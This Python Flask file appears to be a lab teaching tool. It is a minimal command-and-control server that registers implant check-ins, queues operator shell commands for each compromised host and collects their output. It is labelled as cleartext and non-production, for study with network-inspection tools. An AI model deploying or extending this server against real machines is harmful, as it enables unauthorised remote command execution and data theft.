"""
Minimal C2 server (lab).

Teaches the server-side of a C2 framework:
  - Implant check-in and session management
  - Task queue: operator pushes tasks, implant polls and returns results
  - Beaconing telemetry (visible to defender tooling)

NOT a production C2.  The protocol is intentionally cleartext so learners
can inspect it with curl / Wireshark / Zeek.

Endpoints:
  POST /api/beacon           — implant check-in; returns pending task (if any)
  POST /api/result           — implant posts command output
  GET  /api/sessions         — operator lists active sessions
  POST /api/task             — operator queues a command for a session
  GET  /api/results/<sid>    — operator reads results from a session
"""
from __future__ import annotations

import json
import time
import uuid
from collections import defaultdict
from flask import Flask, request, jsonify

app = Flask(__name__)

# In-memory state (resets on restart)
sessions: dict[str, dict] = {}       # sid → {ip, hostname, os, last_seen, ...}
task_queue: dict[str, list] = defaultdict(list)   # sid → [task, ...]
result_store: dict[str, list] = defaultdict(list) # sid → [result, ...]


@app.route("/api/beacon", methods=["POST"])
def beacon():
    """Implant calls this on every beacon interval."""
    data = request.get_json(silent=True) or {}
    sid = data.get("sid") or str(uuid.uuid4())[:8]

    sessions[sid] = {
        "sid":       sid,
        "hostname":  data.get("hostname", "unknown"),
        "username":  data.get("username", "?"),
        "os":        data.get("os", "?"),
        "ip":        request.remote_addr,
        "last_seen": time.time(),
        "pid":       data.get("pid", "?"),
    }

    # Pop next task from queue
    task = task_queue[sid].pop(0) if task_queue[sid] else None
    return jsonify({"sid": sid, "task": task})


@app.route("/api/result", methods=["POST"])
def result():
    """Implant posts the output of an executed task."""
    data = request.get_json(silent=True) or {}
    sid = data.get("sid", "?")
    result_store[sid].append({
        "task":   data.get("task"),
        "output": data.get("output"),
        "ts":     time.time(),
    })
    return jsonify({"status": "ok"})


@app.route("/api/sessions")
def list_sessions():
    return jsonify(list(sessions.values()))


@app.route("/api/task", methods=["POST"])
def queue_task():
    """Operator pushes a shell command for a session to execute."""
    data = request.get_json(silent=True) or {}
    sid = data.get("sid")
    cmd = data.get("cmd")
    if not sid or not cmd:
        return jsonify({"error": "sid and cmd required"}), 400
    task_queue[sid].append({"cmd": cmd, "id": str(uuid.uuid4())[:6]})
    return jsonify({"status": "queued"})


@app.route("/api/results/<sid>")
def get_results(sid: str):
    return jsonify(result_store.get(sid, []))
